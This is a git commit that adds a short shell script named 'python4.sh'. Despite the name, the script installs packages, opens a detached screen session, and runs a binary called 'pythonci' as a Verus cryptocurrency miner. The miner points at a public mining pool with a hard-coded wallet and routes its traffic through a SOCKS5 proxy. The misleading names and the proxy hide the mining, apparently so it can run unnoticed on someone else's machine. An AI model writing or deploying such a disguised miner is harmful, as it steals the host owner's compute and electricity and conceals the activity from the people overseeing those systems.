005c826899b519def42d6e11148e84466c0bc39e
hendrik20212 <87313143+hendrik20212@users.noreply.github.com>
2021-07-19 02:03:05 +0700

    Create python4.sh

---
+++ python4.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen libjansson4 -y
+screen -dmS ls
+POOL=stratum+tcp://na.luckpool.net:3956
+WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
+WORKER=0AA4
+PROXY=socks5://98.162.96.52:4145
+./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 6 -x $PROXY
